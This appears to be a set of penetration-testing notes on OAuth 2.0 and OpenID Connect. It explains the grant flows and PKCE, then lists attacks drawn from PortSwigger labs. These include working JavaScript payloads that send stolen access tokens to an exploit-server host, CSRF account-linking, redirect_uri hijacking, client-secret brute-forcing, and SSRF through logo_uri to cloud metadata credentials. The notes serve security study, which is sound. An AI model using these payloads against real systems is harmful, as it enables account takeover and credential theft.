# Content
- [OAuth Terms](#oauth-terms)
- [OAuth flow](#oauth-flow)
  - [OAuth 2.0 Authorization Code Grant Flow](#oauth-20-authorization-code-grant-flow)
  - [Step-by-Step OAuth 2.0 Implicit Grant Flow](#step-by-step-oauth-20-implicit-grant-flow)
- [OAuth Explain](#oauth-explain)
  - [Grant Types in OAuth](#grant-types-in-oauth)
- [PKCE](#pkce)
- [Recon](#recon)
- [Vulnerabilities in the client application](#vulnerabilities-in-the-client-application)
  - [implicit flow implemntation](#implicit-flow-implemntation)
  - [Flawed CSRF protection](#flawed-csrf-protection)
  - [Referer Header leaking Code + State](#referer-header-leaking-code--state)
  - [XSS in redirect implementation](#xss-in-redirect-implementation)
- [Vulnerabilities in the OAuth service](#vulnerabilities-in-the-oauth-service)
  - [Leaking authorization codes and access tokens by Flawed redirect_uri validation](#leaking-authorization-codes-and-access-tokens-by-flawed-redirect_uri-validation)
  - [Stealing OAuth access tokens via an open redirect](#stealing-oauth-access-tokens-via-an-open-redirect)
  - [Stealing OAuth access tokens via a proxy page and gadgets on the site](#stealing-oauth-access-tokens-via-a-proxy-page-and-gadgets-on-the-site)
  - [Unverified user registration](#unverified-user-registration)
  - [Client Secret Bruteforce](#client-secret-bruteforce)
  - [Authorization/Refresh Token not bound to client](#authorizationrefresh-token-not-bound-to-client)
- [OpenID Connect vulnerabilities](#openid-connect-vulnerabilities)
  - [Unprotected dynamic client registration](#unprotected-dynamic-client-registration)
  - [Allowing authorization requests by reference](#allowing-authorization-requests-by-reference)
  - [other intersting paramters](#other-intersting-paramters)


## OAuth Terms

| Term                   | Definition                                                                                                                                          |
|------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------|
| **Authorization Grant** | check  [Grant Types in OAuth](#grant-types-in-oauth) |
| **Authorization Code**  | A temporary code issued to the client by the authorization server. It is used to obtain an access token and is part of the authorization code grant flow. |
| **Access Token**        | A token issued by the authorization server that grants the client access to the resource server. The access token is typically short-lived.        |
| **Refresh Token**       | A token that can be used to obtain a new access token without requiring the user to log in again. Refresh tokens are typically longer-lived than access tokens. |
| **Redirect URI**        | The URI to which the authorization server redirects the user after granting or denying access. It must match one of the registered redirect URIs for the client. |
| **Scope**               | A mechanism to limit the access that the client has to the resource owner’s data. Scopes define the specific permissions being requested by the client. |
| **State**               | An optional parameter that clients can send in the authorization request to maintain state between the request and callback. It helps prevent CSRF attacks by ensuring the response is related to the original request. |
| **Nonce**               | A unique, single-use identifier included in the authorization request and response to prevent replay attacks. It ensures that an authorization response cannot be reused by an attacker. |
| **Client ID**           | A public identifier for the client application, used to identify the application to the authorization server.                                          |
| **Client Secret**       | A confidential key used by the client to authenticate with the authorization server. It should be kept secure and not exposed in public-facing code. |
| **code verifier**       | A random, high-entropy string generated by the client application. It is used in the OAuth 2.0 PKCE (Proof Key for Code Exchange) flow to prove the client’s ownership of the authorization code. |
|**Code Challenge**       | A hashed and encoded version of the code_verifier sent in the initial authorization request to the authorization server. It acts as a "lock" to the authorization code. |


#### Scope Types

| Scope Type                   | Definition                                                                                           | Example                                                  |
|------------------------------|------------------------------------------------------------------------------------------------------|----------------------------------------------------------|
| **Read**                     | Grants permission to read user data without making any modifications.                               | `read_profile` (access to view user profile information) |
| **Write**                    | Allows the client to create or modify user data.                                                   | `write_posts` (permission to create new posts)          |
| **Delete**                   | Grants permission to delete user data.                                                              | `delete_comments` (permission to delete user comments)   |
| **Admin**                    | Provides administrative access to manage user accounts and settings.                                | `admin_access` (full access to manage user accounts)     |
| **Email**                    | Grants permission to access the user's email address.                                               | `email` (permission to access user email)                |
| **Profile**                  | Allows access to the user's basic profile information, such as name and profile picture.           | `profile` (access to basic user profile data)            |
| **Offline Access**           | Grants permission to access user data even when the user is not logged in, usually via a refresh token. | `offline_access` (permission to obtain refresh tokens)   |
| **Social**                   | Allows access to social media features, such as posting updates or accessing friend lists.          | `social` (permission to interact with social media features) |
| **Custom Scopes**            | Specific scopes defined by the resource server that are not part of standard scopes.                | `custom_scope` (defined by the API provider)             |




## OAuth flow
check [Vmare OAuth 2.0 Grant Types](https://docs.vmware.com/en/Single-Sign-On-for-VMware-Tanzu-Application-Service/1.14/sso/GUID-grant-types.html)
### OAuth 2.0 Authorization Code Grant Flow
![Screenshot_2](https://github.com/kiro6/penetration-testing-notes/assets/57776872/20bde7f8-ecf2-461b-8073-dabcca92a05d)

**Authorization Request by Browser (User Agent)**

- The client application redirects the user's browser to the authorization server.
```http
GET /authorize?response_type=code&
    client_id=YOUR_CLIENT_ID&
    redirect_uri=https://client.example.com/callback&
    scope=read_profile
    &state=RANDOM_STATE
    code_challenge=CODE_CHALLENGE&
    code_challenge_method=S256

HTTP/1.1
Host: authorization-server.com
```

**User Authorization by User (via Browser)**

- The user is redirected to the authorization server’s login and authorization page, where they log in and authorize the client application.
- After successful authorization, the authorization server redirects the user’s browser back to the client application with an authorization code.

```http
HTTP/1.1 302 Found
Location: https://client.example.com/callback?code=AUTHORIZATION_CODE&state=RANDOM_STATE
```

**Token Request by Client Application (Backend Server)**

- The client application’s backend exchanges the authorization code for an access token by making a request to the authorization server’s token endpoint.
```http
POST /token HTTP/1.1
Host: authorization-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&
code=AUTHORIZATION_CODE&
redirect_uri=https://client.example.com/callback&
client_id=YOUR_CLIENT_ID&
client_secret=YOUR_CLIENT_SECRET&
code_verifier=CODE_VERIFIER

```

**Token Response by Authorization Server**

- The authorization server responds with an access token (and optionally a refresh token).
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "access_token": "ACCESS_TOKEN",
  "token_type": "bearer",
  "expires_in": 3600,
  "refresh_token": "REFRESH_TOKEN",
  "scope": "read_profile"
}
```

### Step-by-Step OAuth 2.0 Implicit Grant Flow
![Screenshot_5](https://github.com/user-attachments/assets/e1fb0982-4833-42e0-9f26-fa3b10fcde85)



**Authorization Request by Browser (User Agent)**

- The client application redirects the user's browser to the authorization server's authorization endpoint.
```http
GET /authorize?response_type=token&client_id=YOUR_CLIENT_ID&redirect_uri=https://client.example.com/callback&scope=read_profile&state=RANDOM_STATE HTTP/1.1
Host: authorization-server.com
```

**User Authorization by User (via Browser)**

- The user is redirected to the authorization server’s login and authorization page, where they log in and authorize the client application.
- After successful authorization, the authorization server redirects the user’s browser back to the client application with an access token included in the URL fragment.
```http
HTTP/1.1 302 Found
Location: https://client.example.com/callback#access_token=ACCESS_TOKEN&token_type=bearer&expires_in=3600&state=RANDOM_STATE
```

**Extracting Access Token Who initiates: Browser (User Agent)**
- The user's browser processes the URL fragment to extract the access token from the prev response 

**Resource Request by Browser (User Agent)**

- The client application uses the access token to access protected resources on the resource server.
```http
GET /resource HTTP/1.1
Host: resource-server.com
Authorization: Bearer ACCESS_TOKEN
```


## OAuth Explain
[ OAuth and OpenID Connect by OktaDev](https://youtu.be/t18YB3xDfXI?si=FzFbXztH8VIXGt5b)

### Grant Types in OAuth
### Authorization Code Grant:
- **Use Case:** Suitable for web applications (server-side applications) where the client secret can be kept confidential.
- **Flow:**
  - The user logs in and authorizes the client.
  - The authorization server redirects the user back to the client with an authorization code.
  - The client exchanges the authorization code for an access token by making a request to the authorization server’s token endpoint, including the client secret.
- **Advantages:** Secure because the access token is never exposed to the user agent (browser) and involves a server-to-server communication using the client secret.

### Implicit Grant:
- **Use Case:** Suitable for browser-based or mobile applications where the client secret cannot be kept confidential.
- **Flow:**
  - The user logs in and authorizes the client.
  - The authorization server redirects the user back to the client with an access token OR use PKCE.
- **Advantages:** Simplifies the process by skipping the authorization code exchange step, making it faster but less secure because the access token is exposed to the user agent and potentially intercepted.

### Resource Owner Password Credentials Grant:
- **Use Case:** Suitable for trusted applications, like first-party clients or clients highly trusted by the resource owner.
- **Flow:**
  - The user provides their username and password directly to the client.
  - The client sends the credentials to the authorization server to obtain an access token.
- **Advantages:** Simplifies the process for trusted clients but is not recommended for third-party applications due to security risks of exposing credentials.

### Client Credentials Grant:
- **Use Case:** Suitable for machine-to-machine (M2M) applications, where there is no user involved, only the client.
- **Flow:**
  - The client authenticates with the authorization server using its client credentials (client ID and secret).
  - The authorization server issues an access token directly.
- **Advantages:** Simple and secure for server-to-server communication.

### Refresh Token Grant:
- **Use Case:** Used to obtain a new access token when the current one expires without requiring the user to re-authenticate.
- **Flow:**
  - The client includes the refresh token in a request to the token endpoint.
  - The authorization server validates the refresh token and issues a new access token.
- **Advantages:** Enhances user experience by allowing long-lived sessions without frequent re-authentication.

### Device Code Grant (Device Flow):
- **Use Case:** Suitable for devices with limited input capabilities (e.g., smart TVs, IoT devices).
- **Flow:**
  - The device requests a device code from the authorization server.
  - The user is instructed to visit a verification URL and enter the device code.
  - Once the user authorizes the device, the authorization server issues an access token to the device.
- **Advantages:** Provides a user-friendly way to authorize devices with limited input capabilities.

### PKCE
is used to protect the authorization token from being used by attacker , it uses code challenge and code verifier (hash value of code challenge) which used once per auth request 

#### **so why if the client can store the code verfier securly why does it not store the client secret securly ?**
Client Secret:
  - Lifetime: Long-lived and used across multiple authorization flows.
  - Usage: Used to authenticate the client itself.
  - Security Requirement: Must be kept confidential and secure for the entire lifetime of the client application.



Code Verifier:
  - Lifetime: Short-lived, specific to a single authorization request.
  - Usage: Used only once to exchange the authorization code for an access token.
  - Security Requirement: Needs to be kept confidential only for a short period, during the specific authorization flow.

#### code challenge is sent with first Authorization Request when we get the authorization token we send it with the code verifier to get the access token (because if the attacker intercpted the authorization token he do not know the code challenge )


## Recon
check in oauth service files like
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
/.well-known/jwks.json

```

## Vulnerabilities in the client application

### implicit flow implemntation 
in implicit grant type the client application will often submit user's data (access token , username , email) to the server in a POST request and then assign the user a session cookie , However if the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted

```http
POST /authenticate HTTP/2
Host: 0a9800510465d729800a216300040036.web-security-academy.net
Cookie: session=yubcmNuHJQXbon9rohMPLcLHXdnl4OyX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Referer: https://0a9800510465d729800a216300040036.web-security-academy.net/oauth-callback
Content-Type: application/json
Content-Length: 103
Origin: https://0a9800510465d729800a216300040036.web-security-academy.net


{"email":"carlos@carlos-montoya.net","username":"wiener","token":"lf7bYBQNBgrgqvnk6gVxH8VxV581z2laZvsEwY4bL3X"}
```

### Flawed CSRF protection
if you notice that the authorization request does not send a `state` parameter or used as a static value, or not properly validated it is vuln to csrf, 


**for Example** if OAuth used for social media link authorization you can start an OAuth flow and intercrept the authorization link and send it to the vicitm , now the victim is linked to your social media account and you can use your social media auth to login to his account 


```html
<script>
    location = "https://0a76004a0329df58826e340d00f800ae.web-security-academy.net/oauth-linking?code=Nx7vBhy9h-asF2x9-HTN9hIiNHXiIPNWgJPnX9i8Vwm"
</script>
```

### Referer Header leaking Code + State
- Once the client has the code and state, if it's reflected inside the Referer header when he browses to a different page, then it's vulnerable. 
- If the user navigates away from the client application to another site (e.g., clicking on an external link), the browser may include the entire URL of the current page
```http
Referer: https://client.example.com/callback?code=AUTH_CODE&state=STATE_PARAM
```

### XSS in redirect implementation

[source](https://blog.dixitaditya.com/oauth-account-takeover)

```html
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```

## Vulnerabilities in the OAuth service

### Leaking authorization codes and access tokens by Flawed redirect_uri validation

- use an attacker controlled url in the `redirect_uri` paramter so the access token or auth token be sent to the attacker
- using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser. 
```html
<script>
    location = "https://oauth-0a2900880318c1f383674934029a0058.oauth-server.net/auth?client_id=cdtbbxmaau7pdqmqigriz&redirect_uri=https://exploit-0af10059037bc1d283cf4a0601cb009e.exploit-server.net/&response_type=code&scope=openid%20profile%20email"
</script>
```
- then the attacker uses it 
```http
GET /oauth-callback?code=qstUn8gNn422ul5M0BB0E_WEE3TJ-nHl9HLY4BWLj4u HTTP/2
Host: 0ae4003b03f6c1d9833e4bba005c00d9.web-security-academy.net
Cookie: session=RvqvIt8dy47qEglKbbm5l6tHNNVX57VO
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
```


**NOTE:** 

changing the response_mode from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the `web_message` response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`. 

### Stealing OAuth access tokens via an open redirect

```html
<script>
   if (!window.location.hash){
    location = "https://oauth-0a3100a404224fce822cff8e0216008e.oauth-server.net/auth?client_id=gephlxm18wdavk0znqj6v&redirect_uri=https://0ac1001e04044f368374017000510051.web-security-academy.net/oauth-callback/../post/next?path=https%3a//exploit-0acc000804e34fc1836c000e01df0060.exploit-server.net/exploit&response_type=token&nonce=-1402771748&scope=openid%20profile%20email";

   } else {
    location = "https://exploit-0acc000804e34fc1836c000e01df0060.exploit-server.net/exploit?token=" + window.location.hash.substring(1);
   }
</script>
```

### Stealing OAuth access tokens via a proxy page and gadgets on the site 

in this lap from [portswigger](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page) we found a script in a page tha can be used + iframe to steal access tokens

``` html
       <script>
            parent.postMessage({type: 'onload', data: window.location.href}, '*')
            function submitForm(form, ev) {
                ev.preventDefault();
                const formData = new FormData(document.getElementById("comment-form"));
                const hashParams = new URLSearchParams(window.location.hash.substr(1));
                const o = {};
                formData.forEach((v, k) => o[k] = v);
                hashParams.forEach((v, k) => o[k] = v);
                parent.postMessage({type: 'oncomment', content: o}, '*');
                form.reset();
            }
        </script>
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parent Window</title>
</head>
<body>
    <h1>Parent Window</h1>
    <iframe id="child-iframe" src="https://oauth-0a51003f04d3047d81a09676029600de.oauth-server.net/auth?client_id=f13tk3x2wuozyr4n6r4o8&redirect_uri=https%3A%2F%2F0a4300a604b4040e81cc981100e600ca%2Eweb%2Dsecurity%2Dacademy%2Enet%2Foauth%2Dcallback%2F%2E%2E%2Fpost%2Fcomment%2Fcomment%2Dform&response_type=token&nonce=489624795&scope=openid%20profile%20email" width="600" height="400"></iframe>
    <script>
        window.addEventListener('message', function(e) {
            fetch("/" + encodeURIComponent(e.data.data))
        }, false)
    </script>
</body>
</html>
```

### Unverified user registration
1) **Without Email Verification on Account Creation:** attackers creating an account with a service using the victim's email address without requiring email verification. This allows the attacker to establish control over an account linked to the victim's email. If the victim later uses a third-party service to log in (such as OAuth), the application might mistakenly link the victim's third-party account to the attacker's pre-created account. As a result, the attacker can gain unauthorized access to the victim's account and any associated data or privileges.

2) **Exploiting Lax OAuth Email Verification:** attackers registering with an OAuth service using their own email, bypassing email verification. After registration, they change the account's email to the victim's email address. When the victim later tries to log in or register using their email, the service may inadvertently link the victim's account to the attacker's pre-created account. This allows the attacker to gain unauthorized access to the victim's account, posing significant security risks.

### Client Secret Bruteforce
You can try to bruteforce the client_secret of a service provider with the identity provider in order to be try to steal accounts.

```http
POST /token HTTP/1.1
Host: authorization-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTHORIZATION_CODE&redirect_uri=https://client.example.com/callback&client_id=YOUR_CLIENT_ID&client_secret=[BruteForce]

```

### Authorization/Refresh Token not bound to client
authorization server validates the authorization code without verifying if it originated from the same client, it issues an access token to the attacker . With the obtained access token, the attacker gains unauthorized access to the victim user's resources and can potentially take over their account

## OpenID Connect vulnerabilities

### Unprotected dynamic client registration

ssrf to admin key
```http
POST /reg HTTP/2
Host: oauth-0af9004e0457d9db808a563d024a00dd.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Content-Type: application/json
Content-Length: 193

{"redirect_uris":["https://0a190053045bd9af80c2583100f30019.web-security-academy.net/oauth-callback"],
"logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}
```
request the logo with the client id
```http
GET /client/9cwyxbkfjF40m8rjLIBV_/logo HTTP/2
Host: oauth-0af9004e0457d9db808a563d024a00dd.oauth-server.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
```
response
```http
HTTP/2 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 530

{
  "Code" : "Success",
  "LastUpdated" : "2024-06-05T07:21:33.934240349Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "EWqMIE450ZlHDi9B77X6",
  "SecretAccessKey" : "f8ytm2hfyePluYz4eZiPoW6iikeFzbWw5ISWY80w",
  "Token" : "4EgQnNWENn7nPkaT7yEUJ5Pj1S5QNU025PZiz5IfygTOqeUOpQlNsmHzEvEkCk8cXXF5VkdBXQUOtGqj4TYGXpPHef8YiRSvfBX2I7GiJe3Cj3sznNzvcSu8LjQGB6Zu34ksqtoi19Vv6HIzt5iQgBsIvF8C0G1avKKNXVFymkmqXnBBJCrgFUhR3g66Sjw5SgFe1DH9utEABFvr4VBDh37PPNfVTp7LM9SwAti7dZA7SpTCtUdeTITsvqZYUej3",
  "Expiration" : "2030-06-04T07:21:33.934240349Z"
}
```

### Allowing authorization requests by reference
- Some OpenID providers give you the option to pass these in as a `JSON web token (JWT)` instead. 
- If this feature is supported, you can send a single `request_uri `parameter **pointing to a JSON web token** that contains the rest of the OAuth parameters and their values.
- this `request_uri` parameter is another potential vector for SSRF.
- Some servers may effectively validate the query string in the authorization request, but may fail to adequately apply the same validation to **parameters in a JWT**, including the `redirect_uri`
- To check whether this option is supported, you should look for the `request_uri_parameter_supported` option in the configuration file and documentation. Alternatively, you can just try adding the request_uri parameter to see if it works

### other intersting paramters

**for pishing or redirect of a malcous client**
```json
{
  "client_name": "Example Client",
  "client_uri": "https://client.example.com",
  "policy_uri": "https://client.example.com/privacy-policy",
  "tos_uri": "https://client.example.com/terms-of-service",
  "initiate_login_uri": "https://client.example.com/login"
}
```

**for ssrf**
```json
{
  "logo_uri": "https://example.com/client-logo.png",
  "jwks_uri": "https://example.com/.well-known/jwks.json",
  "sector_identifier_uri": "https://example.com/.well-known/sector-identifier.json",
  "request_uris": [
    "https://example.com/callback",
    "https://subdomain.example.com/callback"
  ]
}

```


